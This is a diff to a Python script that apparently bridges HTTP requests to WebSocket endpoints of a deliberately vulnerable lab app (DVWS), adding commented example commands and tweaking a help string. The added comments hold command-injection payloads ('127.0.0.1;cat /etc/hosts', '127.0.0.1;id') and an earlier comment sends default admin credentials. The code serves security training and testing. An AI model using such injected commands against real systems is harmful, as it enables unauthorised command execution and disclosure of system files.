@@ -15,6 +15,8 @@
 # NOTE: manually --
 # echo -ne '{"auth_user":"YWRtaW4=","auth_pass":"YWRtaW4="}' \
 # | rlwrap websocat 'ws://dvws.local:8080/authenticate-user-blind' --async-stdio 2>/dev/null  | html2text
+# echo -ne '127.0.0.1;cat /etc/hosts' | rlwrap websocat 'ws://dvws.local:8080/command-execution'
+# curl -sk -X GET 'http://127.0.0.1:8000/param?data=127.0.0.1;id' 2>/dev/null ; echo
 
 import sys
 import argparse
@@ -31,7 +33,7 @@ if __name__ == "__main__":
     # bottle opts --
     parser.add_argument("-l", "--lhost", dest="lhost", help="Listen Host")
     parser.add_argument("-p", "--lport", dest="lport", help="Listen Port")
-    parser.add_argument("-d", "--debug", action="store_true", dest="debug", help="Enable WebSocket Debug")
+    parser.add_argument("-d", "--debug", action="store_true", dest="debug", help="Enable Bottle Debug")
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable Verbose Mode")
 
     # websocket opts --
